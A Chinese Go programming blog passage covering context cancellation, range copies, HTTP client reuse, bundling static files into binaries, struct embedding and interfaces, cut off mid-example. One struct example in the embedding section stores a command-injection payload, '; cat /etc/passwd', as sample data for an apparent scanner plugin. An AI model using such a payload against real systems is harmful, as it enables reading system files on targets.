<h2 id="4、context之WithCancel的使用"><a href="#4、context之WithCancel的使用" class="headerlink" title="4、context之WithCancel的使用"></a>4、context之WithCancel的使用</h2><p>在golang中会经常使用协程来进行并发处理，对于想控制协程退出的场景下，需要使用context来控制协程何时退出</p>
<p>context.WithCancel()函数接受一个 Context 并返回其子Context和取消函数cancel，当调用cancel取消函数时，所有位于context(函数参数)下面的子context(函数返回值)都会收到消息而退出，代码示例如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 父context(利用根context得到)</span></span><br><span class="line">	ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 父context的子协程</span></span><br><span class="line">	<span class="keyword">go</span> watch1(ctx)</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 子context，注意：这里虽然也返回了cancel的函数对象，但是未使用</span></span><br><span class="line">	valueCtx, _ := context.WithCancel(ctx)</span><br><span class="line">	<span class="comment">// 子context的子协程</span></span><br><span class="line">	<span class="keyword">go</span> watch2(valueCtx)</span><br><span class="line"> </span><br><span class="line">	fmt.Println(<span class="string">&quot;现在开始等待3秒,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">	time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 调用cancel()</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;等待3秒结束,调用cancel()函数&quot;</span>)</span><br><span class="line">	cancel()</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 再等待5秒看输出，可以发现父context的子协程和子context的子协程都会被结束掉</span></span><br><span class="line">	time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">	fmt.Println(<span class="string">&quot;最终结束,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父context的协程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">watch1</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-ctx.Done(): <span class="comment">//取出值即说明是结束信号</span></span><br><span class="line">			fmt.Println(<span class="string">&quot;收到信号，父context的协程退出,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Println(<span class="string">&quot;父context的协程监控中,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 子context的协程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">watch2</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-ctx.Done(): <span class="comment">//取出值即说明是结束信号</span></span><br><span class="line">			fmt.Println(<span class="string">&quot;收到信号，子context的协程退出,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Println(<span class="string">&quot;子context的协程监控中,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">现在开始等待<span class="number">3</span>秒,time= <span class="number">1649582546</span></span><br><span class="line">子context的协程监控中,time= <span class="number">1649582546</span></span><br><span class="line">父context的协程监控中,time= <span class="number">1649582546</span></span><br><span class="line">父context的协程监控中,time= <span class="number">1649582547</span></span><br><span class="line">子context的协程监控中,time= <span class="number">1649582547</span></span><br><span class="line">子context的协程监控中,time= <span class="number">1649582548</span></span><br><span class="line">父context的协程监控中,time= <span class="number">1649582548</span></span><br><span class="line">等待<span class="number">3</span>秒结束,调用cancel()函数</span><br><span class="line">收到信号，父context的协程退出,time= <span class="number">1649582549</span></span><br><span class="line">收到信号，子context的协程退出,time= <span class="number">1649582549</span></span><br><span class="line">最终结束,time= <span class="number">1649582554</span></span><br></pre></td></tr></table></figure>

<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yzf279533105/article/details/107290645">https://blog.csdn.net/yzf279533105/article/details/107290645</a></p>
<h2 id="5、range是值拷贝出来的副本"><a href="#5、range是值拷贝出来的副本" class="headerlink" title="5、range是值拷贝出来的副本"></a>5、range是值拷贝出来的副本</h2><p>在使用range遍历slice或者map的时候，要注意的是，循环的值都是被range值拷贝出来的副本值</p>
<p>举个例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Test <span class="keyword">struct</span> &#123;</span><br><span class="line">    Index <span class="type">int</span></span><br><span class="line">    Num   <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t []Test</span><br><span class="line">    t = <span class="built_in">append</span>(t,Test&#123;Index:<span class="number">1</span>,Num:<span class="number">1</span>&#125;)</span><br><span class="line">    t = <span class="built_in">append</span>(t,Test&#123;Index:<span class="number">2</span>,Num:<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> t &#123;</span><br><span class="line">        v.Num += <span class="number">100</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _,v:= <span class="keyword">range</span> t&#123;</span><br><span class="line">        fmt.Println(v.Index,v.Num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>因为这里的v已经不是原来t中的了，而是值拷贝出来的副本值，副本值，副本值！</p>
<p>当然，map中的结果也是一样</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]Test)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">    v.Num += <span class="number">100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了解决这个问题，可以使用指针</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t []*Test</span><br><span class="line">t = <span class="built_in">append</span>(t,&amp;Test&#123;Index:<span class="number">1</span>,Num:<span class="number">1</span>&#125;)</span><br><span class="line">t = <span class="built_in">append</span>(t,&amp;Test&#123;Index:<span class="number">2</span>,Num:<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> t &#123;</span><br><span class="line">    v.Num += <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">101</span></span><br><span class="line"><span class="number">2</span> <span class="number">102</span></span><br></pre></td></tr></table></figure>

<p>对于切片来说，可以使用下标来修改数组的值，在golang中通过下标访问（类似于基址寻址）</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, _ := <span class="keyword">range</span> t &#123;</span><br><span class="line">    t[i].Num += <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">101</span></span><br><span class="line"><span class="number">2</span> <span class="number">102</span></span><br></pre></td></tr></table></figure>



<h2 id="6、句柄"><a href="#6、句柄" class="headerlink" title="6、句柄"></a>6、句柄</h2><p>在linux中，打开文件的时候会产生一个句柄，但在进行socket连接时也会产生一个句柄，如果socket没有断开连接的话  会导致文件句柄过多而产生异常</p>
<p>在使用协程进行并发式的http请求时，建议创建一个全局的http.Client，使用默认的transport配置</p>
<p>如果忽略ssl证书问题的需求，可以复制一份默认配置，添加上自己的配置</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//transport默认配置：</span></span><br><span class="line"><span class="keyword">var</span> DefaultTransport RoundTripper = &amp;Transport&#123;</span><br><span class="line">   Proxy: ProxyFromEnvironment,</span><br><span class="line">   DialContext: (&amp;net.Dialer&#123;</span><br><span class="line">      Timeout:   <span class="number">30</span> * time.Second,</span><br><span class="line">      KeepAlive: <span class="number">30</span> * time.Second,</span><br><span class="line">      DualStack: <span class="literal">true</span>,</span><br><span class="line">   &#125;).DialContext,</span><br><span class="line">   ForceAttemptHTTP2:     <span class="literal">true</span>,</span><br><span class="line">   MaxIdleConns:          <span class="number">100</span>,</span><br><span class="line">   IdleConnTimeout:       <span class="number">90</span> * time.Second,</span><br><span class="line">   TLSHandshakeTimeout:   <span class="number">10</span> * time.Second,</span><br><span class="line">   ExpectContinueTimeout: <span class="number">1</span> * time.Second,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="7、静态资源打包进二进制"><a href="#7、静态资源打包进二进制" class="headerlink" title="7、静态资源打包进二进制"></a>7、静态资源打包进二进制</h2><p>有时候二进制需要结合前端页面来进行展示，网上大多使用embed来嵌入静态文件，但在迁移部署的时候需要将二进制程序和静态前端页面一起打包，不光麻烦，看着也不够优雅，若只有一个二进制程序多省事(～￣▽￣)～</p>
<p>这时候需要将前端的静态文件打包进二进制中，即以golang的代码形式写入源码中</p>
<p>网上搜了搜，这里我使用的是第三方库github.com&#x2F;libragen&#x2F;felix，这个库能将静态前端页面进行打包成http.fileServer（具体原理详见参考链接），供gin以中间件的形式使用（中间件用于对HTTP Request请求进行拦截处理，类型为gin.HandlerFunc，函数类型），前端我是用的vue进行生成，打包过程如下：</p>
<p><strong>1）vue打包生成前端静态页面</strong>（不知道如何使用vue生成静态页面的麻烦自行百度，这里不多介绍）</p>
<p><strong>2）felix ginbin -s ${前端编译好的dist目录路径}</strong>  </p>
<p>-s 前端编译好的代码目录,也可以适用于普通的前端项目 -d输出go代码的目录(包),默认当前工作目录</p>
<p>打包好的部分代码如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打包完成后会生成felixbin目录，里面的gin_static.go即为生成的golang代码</span></span><br><span class="line"><span class="comment">// - felix</span></span><br><span class="line"><span class="comment">// - felixbin</span></span><br><span class="line"><span class="comment">//   -  gin_static.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gin中间件的处理函数，在配置gin的时候会用到</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGinStaticBinMiddleware</span><span class="params">(urlPrefix <span class="type">string</span>)</span></span> (gin.HandlerFunc, <span class="type">error</span>) &#123;</span><br><span class="line">	fs, err := create(zipData)   <span class="comment">// 创建http.fileServer文件系统</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	fileserver := http.FileServer(fs)</span><br><span class="line">	<span class="keyword">if</span> urlPrefix != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fileserver = http.StripPrefix(urlPrefix, fileserver)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		urlPath := strings.TrimSpace(c.Request.URL.Path)</span><br><span class="line">		<span class="keyword">if</span> urlPath == urlPrefix &#123;</span><br><span class="line">			urlPath = path.Join(urlPrefix, indexHtml)</span><br><span class="line">		&#125;</span><br><span class="line">		f, err := fs.Open(urlPath)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fi, err := f.Stat()</span><br><span class="line">		<span class="keyword">if</span> strings.HasSuffix(urlPath,<span class="string">&quot;.html&quot;</span>)&#123;</span><br><span class="line">			c.Header(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> || !fi.IsDir() &#123;</span><br><span class="line">			fileserver.ServeHTTP(c.Writer, c.Request)</span><br><span class="line">			c.Abort()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3）项目中创建并配置gin</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">r := gin.Default()</span><br><span class="line">binStaticMiddleware, err := felixbin.NewGinStaticBinMiddleware(<span class="string">&quot;/&quot;</span>)  <span class="comment">// 创建中间件</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">r.Use(binStaticMiddleware)   <span class="comment">// 使用创建的中间件</span></span><br><span class="line">api := r.server.Group(<span class="string">&quot;/_/api&quot;</span>)      <span class="comment">//创建后端接口 /_/api/get_status</span></span><br><span class="line">api.GET(<span class="string">&quot;/get_status&quot;</span>, getStatus)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getStatus</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.String(http.StatusOK, <span class="string">&quot;reverse platform running ok.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://mojotv.cn/2019/07/27/how-to-serve-frontend-code-with-api-in-go">https://mojotv.cn/2019/07/27/how-to-serve-frontend-code-with-api-in-go</a></p>
<h2 id="8、结构体继承与组合"><a href="#8、结构体继承与组合" class="headerlink" title="8、结构体继承与组合"></a>8、结构体继承与组合</h2><p>如果一个struct嵌套了另一个匿名结构体，那么这个结构可以直接访问匿名结构体的方法，从而实现继承</p>
<p>如果一个struct嵌套了另一个有名的结构体，那么这个模式叫做组合，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> pluginBase <span class="keyword">struct</span> &#123;         </span><br><span class="line">	Enable <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> enabled() <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.Enable</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> setEnabled(enable <span class="type">bool</span>) &#123;</span><br><span class="line">	p.Enable = enable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rule <span class="keyword">struct</span> &#123;</span><br><span class="line">	ruleName <span class="type">string</span></span><br><span class="line">	payload  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *rule)</span></span> getRuleName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> r.ruleName</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> cmdInjection <span class="keyword">struct</span> &#123;</span><br><span class="line">	pluginBase                    <span class="comment">// 匿名继承pluginBase结构体，可以直接使用pluginBase的enabled和setEnabled方法</span></span><br><span class="line">	name       <span class="type">string</span></span><br><span class="line">	injectRule rule               <span class="comment">// 嵌套有名的结构体，需要通过injectRule.getRuleName来调用方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cmdInjection)</span></span> getName() <span class="type">string</span> &#123;   <span class="comment">// cmdInjection本身的方法</span></span><br><span class="line">	<span class="keyword">return</span> c.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建结构体</span></span><br><span class="line">	injectRule := rule&#123;</span><br><span class="line">		ruleName: <span class="string">&quot;linux command inject&quot;</span>,</span><br><span class="line">		payload:  <span class="string">&quot;; cat /etc/passwd&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	cmdInjectPlugin := cmdInjection&#123;</span><br><span class="line">		name:       <span class="string">&quot;command injection&quot;</span>,</span><br><span class="line">		injectRule: injectRule,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(cmdInjectPlugin.getName())                   <span class="comment">// 调用cmdInjectPlugin本身的方法</span></span><br><span class="line">	fmt.Println(cmdInjectPlugin.injectRule.getRuleName())    <span class="comment">// 调用嵌套结构体injectRule的方法</span></span><br><span class="line">	fmt.Println(cmdInjectPlugin.enabled())                   <span class="comment">// 调用继承结构体pluginBase的方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">command injection</span><br><span class="line">linux command inject</span><br><span class="line"><span class="literal">false</span>         <span class="comment">// 没有对enable赋值，默认为false</span></span><br></pre></td></tr></table></figure>



<h2 id="9、golang接口"><a href="#9、golang接口" class="headerlink" title="9、golang接口"></a>9、golang接口</h2><p>golang中的接口是一个或多个方法签名的集合，只有方法声明，没有实现，没有数据字段</p>
<p>接口可以匿名嵌入其它接口，或嵌入到结构中</p>
<p>将结构体赋值给接口时，会发生拷贝，而<strong>接口内部存储的是指向这个复制品的指针，既无法修改复制品的状态，也无法获取指针</strong> </p>
<p>示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Test <span class="keyword">struct</span> &#123;</span><br><span class="line">	a <span class="type">int</span></span><br><span class="line">	b <span class="type">int</span></span><br><span class="line">	c <span class="keyword">interface</span>&#123;&#125;    <span class="comment">// 定义元素类型为接口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	b := Test&#123;a: <span class="number">1</span>&#125;</span><br><span class="line">	i = b</span><br><span class="line">	fmt.Println(i, b)     <span class="comment">// 输出i和b的值</span></span><br><span class="line">	fmt.Println(fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;b), fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;i))   <span class="comment">// 打印地址</span></span><br><span class="line">	b.b = <span class="number">2</span>               <span class="comment">// 修改原结构体的元素，接口的值不变</span></span><br><span class="line">	fmt.Println(i, b)</span><br><span class="line">    i = &amp;b                <span class="comment">// 当赋值为结构体b的指针时，接口和结构体指向的是同一个</span></span><br><span class="line">	i.(*Test).a = <span class="number">2</span></span><br><span class="line">	fmt.Println(fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;b), fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, i))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;<span class="number">1</span> <span class="number">0</span> &lt;<span class="literal">nil</span>&gt;&#125; &#123;<span class="number">1</span> <span class="number">0</span> &lt;<span class="literal">nil</span>&gt;&#125;</span><br><span class="line"><span class="number">0xc000024040</span> <span class="number">0xc0000100a0</span>    <span class="comment">// 打印接口i和结构体b的地址  接口内部存储的是指向这个复制品的指针</span></span><br><span class="line">&#123;<span class="number">1</span> <span class="number">0</span> &lt;<span class="literal">nil</span>&gt;&#125; &#123;<span class="number">1</span> <span class="number">2</span> &lt;<span class="literal">nil</span>&gt;&#125;      <span class="comment">// 原结构体b的值变了，但接口i不变</span></span><br><span class="line"><span class="number">0xc000024040</span> <span class="number">0xc000024040</span>    <span class="comment">// 接口赋值为指针时，两者指向一致</span></span><br></pre></td></tr></table></figure>

<p>当尝试通过接口来修改结构体的值时，会报错：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Test <span class="keyword">struct</span> &#123;</span><br><span class="line">	a <span class="type">int</span></span><br><span class="line">	b <span class="type">int</span></span><br><span class="line">	c <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	b := Test&#123;a: <span class="number">1</span>&#125;</span><br><span class="line">	i = b</span><br><span class="line">	i.(Test).a = <span class="number">1</span>                        <span class="comment">// 复制品不能通过接口赋值，接口赋值结构体指针的时候可以</span></span><br><span class="line">    fmt.Println(&amp;i.(Test).a)              <span class="comment">// 不能获取结构体内的元素的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">./test.<span class="keyword">go</span>:<span class="number">174</span>:<span class="number">13</span>: cannot assign to i.(Test).a  </span><br><span class="line">./test.<span class="keyword">go</span>:<span class="number">178</span>:<span class="number">14</span>: cannot take the address of i.(Test).a  </span><br></pre></td></tr></table></figure>



<p>只要某个类型a拥有该接口b的所有方法签名（通过自己定义或者匿名继承都可，不懂继承的可见上面的第8条结构体继承与组合），即算实现该接口，无需显示声明实现了哪个接口，类型a也会被认为接口b类型，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> pluginBase <span class="keyword">struct</span> &#123;</span><br><span class="line">	Enable <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span 